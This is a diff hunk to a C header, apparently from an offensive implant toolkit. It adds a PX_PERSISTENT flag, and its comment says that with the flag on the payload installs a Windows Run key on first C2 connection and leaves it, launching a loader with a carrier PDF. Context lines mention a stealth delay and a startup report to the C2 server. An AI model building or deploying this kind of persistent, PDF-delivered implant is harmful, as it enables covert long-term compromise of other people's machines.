@@ -131,6 +131,25 @@
 #define PX_STEALTH_DELAY 0
 #endif
 
+/* The persistence flag.
+ *
+ * The capability library's `persist` technique writes a Run key and then
+ * REMOVES it, because a lab technique that leaves litter is not a lab
+ * technique.
+ *
+ * This flag is for the other case: an instrument that is meant to
+ * survive a reboot. With it on, the payload installs the Run key on its
+ * first connection and LEAVES it, and reports the command that removes
+ * it.
+ *
+ * The Run key points at the loader with the carrier PDF as its argument,
+ * because an in-memory payload has no image of its own -- the loader
+ * tells it where the document is.
+ */
+#ifndef PX_PERSISTENT
+#define PX_PERSISTENT 0
+#endif
+
 /* ================================================================== */
 /* The report the payload sends to the C2 server at startup.            */
 /* ================================================================== */
